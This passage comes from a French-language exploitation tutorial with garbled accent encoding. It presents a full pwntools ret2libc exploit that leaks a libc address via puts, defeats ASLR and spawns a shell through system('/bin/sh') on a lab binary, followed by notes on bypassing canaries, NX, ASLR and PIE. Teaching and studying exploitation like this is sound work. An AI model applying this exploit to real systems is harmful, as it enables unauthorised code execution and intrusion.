### ScÃ©nario 3 : Exploitation avec ASLR (ret2libc)

**Objectif :** Appeler `system("/bin/sh")` malgrÃ© ASLR.

**Technique :**
1. Leak une adresse de la libc (via puts ou printf)
2. Calculer la base de la libc
3. Trouver `system()` et `"/bin/sh"` dans la libc
4. Construire un ROP chain

**exploit.py :**
```python
#!/usr/bin/env python3
from pwn import *

binary = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./vuln')

# Ã‰tape 1 : Leak puts@libc
rop = ROP(binary)
rop.puts(binary.got['puts'])    # Appeler puts(puts@GOT) pour leak l'adresse
rop.main()                       # Retourner Ã  main pour un 2Ã¨me exploit

payload1 = b'A' * 72 + rop.chain()
p.sendline(payload1)

# RÃ©cupÃ©rer le leak
p.recvuntil(b'Bonjour, ')
puts_leak = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f'puts@libc leaked: {hex(puts_leak)}')

# Calculer la base de la libc
libc.address = puts_leak - libc.symbols['puts']
log.info(f'libc base: {hex(libc.address)}')

# Ã‰tape 2 : Appeler system("/bin/sh")
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh\x00')))

payload2 = b'A' * 72 + rop2.chain()
p.sendline(payload2)

p.interactive()
```

## ğŸ“ Points clÃ©s

- En x64, les **adresses font 8 bytes** (vs 4 bytes en x86)
- La stack croÃ®t vers les **adresses basses** (downward)
- **RSP** = sommet actuel, **RBP** = base du frame, **RIP** = prochaine instruction
- **Offset** = Taille buffer + Padding + 8 (saved RBP)
- L'instruction **ret** pop l'adresse de retour dans RIP â†’ c'est notre cible
- **Canary** : Valeur secrÃ¨te entre buffer et return address (bypass : leak ou bruteforce)
- **NX** : Stack non-exÃ©cutable (bypass : ROP ou ret2libc)
- **ASLR** : Adresses randomisÃ©es (bypass : information leak)
- **PIE** : Code randomisÃ© (bypass : leak + calcul de base)
- En exploitation moderne, on **combine** plusieurs techniques (leak + ROP + bypass canary)

## â¡ï¸ Prochaine Ã©tape

Maintenant que tu maÃ®trises le stack overflow x64, le prochain module va t'apprendre :

**Module 23 - ROP Chains x64** : Return-Oriented Programming
- Comprendre les gadgets ROP (sÃ©quences d'instructions terminÃ©es par "ret")
- Construire des chaÃ®nes ROP pour bypasser NX
- Utiliser ROPgadget et ropper pour trouver des gadgets
- Techniques avancÃ©es : ret2libc, ret2syscall, SROP
- Exploitation complÃ¨te avec toutes les protections activÃ©es

Tu vas passer de l'exploitation basique Ã  l'exploitation avancÃ©e contre des binaires modernes durcis !
